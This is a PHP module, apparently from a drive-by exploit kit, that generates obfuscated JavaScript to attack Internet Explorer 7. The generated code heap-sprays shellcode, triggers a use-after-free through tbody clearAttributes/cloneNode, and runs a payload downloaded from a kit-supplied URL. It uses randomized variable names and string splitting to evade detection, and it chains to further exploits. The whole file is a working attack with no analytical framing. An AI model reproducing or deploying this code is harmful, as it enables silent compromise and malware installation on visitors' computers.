<?php

$randVar = $GLOBALS['cpFunctions']->CreateArrayString( rand( 10, 30 ), '100' );
$strUrl = $GLOBALS['cpXplHelper']->GetURL( 'msiemc', $browser, $os, 'msiemc' );

if (( $browser == 'ie' && $version == 7 )) {
	$functionName = $ExploitFunctions[2];
	$replaceFunction = $GLOBALS['cpFunctions']->RandAlpha( 2 );
	$eArray[] = '
function ' . $functionName . '(){
	try {
	var ' . $randVar[40] . ' = "' . $GLOBALS['cpXplHelper']->GetJSShellcode( $strUrl, $replaceFunction ) . '".replace(/' . $replaceFunction . '/g,"Au".replace(/A/g,"B").replace(/B/g,unescape("%25")));
	var ' . $randVar[0] . ' = unescape(' . $randVar[40] . ');
	var ' . $randVar[1] . ' = new Array();
	var ' . $randVar[2] . ' = 0x100000 - (' . $randVar[0] . '.length * 2 + 0x01020);
	var ' . $randVar[3] . ' = unescape("' . $randVar[13] . '%' . $randVar[13] . 'u' . $randVar[13] . '0' . $randVar[13] . 'C' . $randVar[13] . '0' . $randVar[13] . 'C' . $randVar[13] . '%' . $randVar[13] . 'u' . $randVar[13] . '0' . $randVar[13] . 'C' . $randVar[13] . '0' . $randVar[13] . 'C".replace(/' . $randVar[13] . '/g,""));
	while (' . $randVar[3] . '.length < ' . $randVar[2] . '/2) { ' . $randVar[3] . '+=' . $randVar[3] . ';} var ' . $randVar[5] . ' = ' . $randVar[3] . '.substring(0,' . $randVar[2] . '/2);
	delete ' . $randVar[3] . ';
	for (' . $randVar[4] . ' = 0; ' . $randVar[4] . ' < 0xC0; ' . $randVar[4] . ' ++ ){
		' . $randVar[1] . '[' . $randVar[4] . '] = ' . $randVar[5] . ' + ' . $randVar[0] . ';
	}
	CollectGarbage();
	var ' . $randVar[6] . ' = unescape("' . $replaceFunction . '%' . $replaceFunction . 'u' . $replaceFunction . '0' . $replaceFunction . 'b' . $replaceFunction . '0' . $replaceFunction . 'b' . $replaceFunction . '%' . $replaceFunction . 'u' . $replaceFunction . '0' . $replaceFunction . 'b0' . $replaceFunction . 'bA' . $replaceFunction . 'AA' . $replaceFunction . 'AA' . $replaceFunction . 'AA' . $replaceFunction . 'AA' . $replaceFunction . 'AA' . $replaceFunction . 'AA' . $replaceFunction . 'AA' . $replaceFunction . 'AA' . $replaceFunction . 'AA' . $replaceFunction . 'AA' . $replaceFunction . 'AA' . $replaceFunction . 'A' . $replaceFunction . 'A".replace(/' . $replaceFunction . '/g,""));
	var ' . $randVar[7] . ' = new Array();
	for (var ' . $randVar[8] . ' = 0; ' . $randVar[8] . ' < 1000; ' . $randVar[8] . ' ++ )
		' . $randVar[7] . '.push(document.createElement("' . $randVar[13] . 'i' . $randVar[13] . 'm' . $randVar[13] . 'g' . $randVar[13] . '".replace(/' . $randVar[13] . '/g,"")));
	' . $randVar[9] . ' = document.createElement("' . $randVar[13] . 't' . $randVar[13] . 'b' . $randVar[13] . 'o' . $randVar[13] . 'd' . $randVar[13] . 'y' . $randVar[13] . '".replace(/' . $randVar[13] . '/g,""));
	' . $randVar[9] . '.click;
	var ' . $randVar[10] . ' = ' . $randVar[9] . '.cloneNode();
	' . $randVar[9] . '.clearAttributes();
	' . $randVar[9] . ' = null;
	CollectGarbage();
	for (var ' . $randVar[8] . ' = 0; ' . $randVar[8] . ' < ' . $randVar[7] . '.length; ' . $randVar[8] . ' ++ ){
		' . $randVar[7] . '[' . $randVar[8] . '].src = ' . $randVar[6] . ';
	}
	' . $randVar[10] . '.click;
	}catch(e){
		{next}
		return;
	}
	setTimeout("{next}", 1100);
}';
}

?>
